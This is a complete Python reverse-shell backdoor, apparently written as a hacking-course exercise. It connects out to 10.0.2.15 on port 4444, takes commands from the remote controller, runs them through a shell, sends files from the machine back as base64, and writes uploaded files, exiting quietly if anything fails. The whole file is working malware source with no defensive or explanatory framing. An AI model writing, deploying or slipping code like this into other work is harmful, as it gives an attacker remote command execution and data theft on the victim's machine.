#!/usr/bin/env python
import socket
import subprocess
import json
import os, sys
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)      # AF_INET == ipv4 & SOCK_STREAM == TCP
        self.connection.connect((ip, port))

    def box_send(self, data):
        json_data = json.dumps(data.decode('utf-8'))
        self.connection.send(json_data.encode('utf-8'))

    def box_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_directory(self, path):
        os.chdir(path)
        changed_path = 'changing working directory to ' + path
        return changed_path.encode('utf-8')  # here we encode bcoz box_send() takes bytes not strings

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return b'>> Upload Successful'  # here we encode bcoz box_send() takes bytes not strings

    def run(self):
        while True:
            command = self.box_receive()

            try:
                if command[0] == 'exit':
                    self.connection.close()
                    exit()
                elif command[0] == 'cd' and len(command) > 1:
                    result = self.change_directory(command[1])
                elif command[0] == 'download':
                    result = self.read_file(command[1])
                elif command[0] == 'upload':
                    result = self.write_file(command[1], command[2])
                else:
                    result = self.execute_system_command(command)
            except Exception:
                result = b'>> something went wrong'

            self.box_send(result)


try:
    my_backdoor = Backdoor('10.0.2.15', 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
    
    
# reverse backdoor back_main
